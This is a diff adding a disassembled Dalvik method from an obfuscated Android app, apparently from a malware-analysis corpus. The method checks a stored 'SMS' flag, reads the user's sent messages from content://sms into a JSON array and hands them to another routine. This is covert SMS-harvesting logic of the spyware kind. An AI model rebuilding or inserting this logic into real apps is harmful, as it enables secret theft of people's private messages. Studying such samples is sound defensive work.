@@ -1,0 +1,77 @@
+# Lb/b/a/a/b;->a()V [access_flags=public]
+#
+# Parameters:
+# local registers: v0...v3
+#
+# - return:void
+
+a-BB@0x0 : [ a-BB@0x4 ]
+	0       (00000000) const-string         v0, 'SMS'
+
+a-BB@0x4 : [ a-BB@0x16 a-BB@0x98 ]
+	1       (00000004) sget-object          v1, Lcom/mixio/tosh/aprl/aetn/ate;->e Landroid/content/SharedPreferences;
+	2       (00000008) const/4              v2, 1
+	3       (0000000a) invoke-interface     v1, v0, v2, Landroid/content/SharedPreferences;->getInt(Ljava/lang/String; I)I
+	4       (00000010) move-result          v1
+	5       (00000012) if-ne                v1, v2, +43
+	4:73
+	(Ljava/lang/Exception; -> 76 a-BB@0x76)
+
+a-BB@0x16 : [ a-BB@0x2c a-BB@0x3e ]
+	6       (00000016) new-instance         v1, Lorg/json/JSONArray;
+	7       (0000001a) invoke-direct        v1, Lorg/json/JSONArray;-><init>()V
+	8       (00000020) iput-object          v1, v3, Lb/b/a/a/b;->c Lorg/json/JSONArray;
+	9       (00000024) sget-boolean         v1, Lcom/mixio/tosh/aprl/aetn/ate;->h Z
+	10      (00000028) if-ne                v1, v2, +b
+	4:73
+	(Ljava/lang/Exception; -> 76 a-BB@0x76)
+
+a-BB@0x2c : [ a-BB@0x3e ]
+	11      (0000002c) sget-object          v1, Lcom/mixio/tosh/aprl/aetn/ate;->g Lb/b/a/a/f/a;
+	12      (00000030) sget-object          v2, Lcom/mixio/tosh/aprl/aetn/ate;->g Lb/b/a/a/f/a;
+	13      (00000034) sget-object          v2, Lb/b/a/a/f/a;->b Ljava/lang/String;
+	14      (00000038) invoke-virtual       v1, v0, v2, Lb/b/a/a/f/a;->a(Ljava/lang/String; Ljava/lang/String;)V
+	4:73
+	(Ljava/lang/Exception; -> 76 a-BB@0x76)
+
+a-BB@0x3e : [ a-BB@0x54 a-BB@0x98 ]
+	15      (0000003e) const-string         v0, 'content://sms'
+	16      (00000042) const-string         v1, 'Sent'
+	17      (00000046) invoke-virtual       v3, v0, v1, Lb/b/a/a/b;->a(Ljava/lang/String; Ljava/lang/String;)V
+	18      (0000004c) sget-boolean         v0, Lcom/mixio/tosh/aprl/aetn/ate;->h Z
+	19      (00000050) if-nez               v0, +24
+	4:73
+	(Ljava/lang/Exception; -> 76 a-BB@0x76)
+
+a-BB@0x54 : [ a-BB@0x5c a-BB@0x98 ]
+	20      (00000054) iget-object          v0, v3, Lb/b/a/a/b;->c Lorg/json/JSONArray;
+	21      (00000058) if-eqz               v0, +20
+	4:73
+	(Ljava/lang/Exception; -> 76 a-BB@0x76)
+
+a-BB@0x5c : [ a-BB@0x6c a-BB@0x98 ]
+	22      (0000005c) iget-object          v0, v3, Lb/b/a/a/b;->c Lorg/json/JSONArray;
+	23      (00000060) invoke-virtual       v0, Lorg/json/JSONArray;->length()I
+	24      (00000066) move-result          v0
+	25      (00000068) if-lez               v0, +18
+	4:73
+	(Ljava/lang/Exception; -> 76 a-BB@0x76)
+
+a-BB@0x6c : [ a-BB@0x98 ]
+	26      (0000006c) const/4              v0, 0
+	27      (0000006e) invoke-virtual       v3, v0, Lb/b/a/a/b;->a(Z)V
+	28      (00000074) goto                 +12
+
+a-BB@0x76 : [ a-BB@0x98 ]
+	29      (00000076) move-exception       v0
+	30      (00000078) const-string         v1, 'aona Error '
+	31      (0000007c) invoke-static        v1, Lb/a/a/a/a;->a(Ljava/lang/String;)Ljava/lang/StringBuilder;
+	32      (00000082) move-result-object   v1
+	33      (00000084) invoke-virtual       v0, Ljava/lang/Exception;->getMessage()Ljava/lang/String;
+	34      (0000008a) move-result-object   v0
+	35      (0000008c) invoke-virtual       v1, v0, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+	36      (00000092) invoke-virtual       v1, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
+
+a-BB@0x98 : 
+	37      (00000098) return-void          
+
